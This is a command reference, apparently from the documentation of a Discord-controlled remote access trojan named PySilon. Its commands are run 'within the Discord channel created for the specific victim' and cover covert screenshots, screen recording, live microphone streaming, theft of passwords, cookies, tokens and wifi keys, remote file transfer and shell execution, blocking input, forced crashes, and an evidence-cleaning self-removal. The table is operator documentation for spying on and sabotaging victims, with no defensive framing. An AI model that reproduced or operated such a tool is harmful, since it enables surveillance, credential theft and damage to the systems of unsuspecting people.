# Available Commands

All commands are executed within the Discord channel created for the specific victim.

| Command | Description | Usage |
| :--- | :--- | :--- |
| `.ss` | Take a screenshot | `.ss` |
| `.screenrec` | Record screen for 15 seconds | `.screenrec` |
| `.join` | Stream live microphone to voice channel | `.join` |
| `.grab` | Grab sensitive data | `.grab <passwords/cookies/tokens/wifi>` |
| `.upload` | Upload file to target | `.upload <type> [name]` |
| `.download` | Download file from target | `.download <path>` |
| `.cd` | Change directory | `.cd <path>` |
| `.ls` | List directory contents | `.ls` |
| `.pwd` | Show current path | `.pwd` |
| `.rm` | Remove file/directory | `.rm <path>` |
| `.exec` | Execute a file | `.exec <path>` |
| `.cmd` | Run shell command | `.cmd <command>` |
| `.kill` | Kill a process | `.kill <pid/name>` |
| `.blacklist` | Block a process | `.blacklist <process_name>` |
| `.whitelist` | Unblock a process | `.whitelist <process_name>` |
| `.block-input` | Block mouse/keyboard | `.block-input` |
| `.unblock-input` | Unblock mouse/keyboard | `.unblock-input` |
| `.monitors-off` | Turn off monitors | `.monitors-off` |
| `.monitors-on` | Turn on monitors | `.monitors-on` |
| `.bsod` | Trigger Blue Screen of Death | `.bsod` |
| `.critical-enable` | Make process critical (BSOD if killed) | `.critical-enable` |
| `.critical-disable` | Disable critical status | `.critical-disable` |
| `.implode` | Remove PySilon and clean evidence | `.implode` |
| `.jumpscare` | Play loud jumpscare | `.jumpscare` |
| `.tts` | Text-to-speech | `.tts <message>` |
| `.msg` | Send message box | `.msg title="<t>" text="<txt>"` |

*Note: Some commands may require administrative privileges to function correctly.*
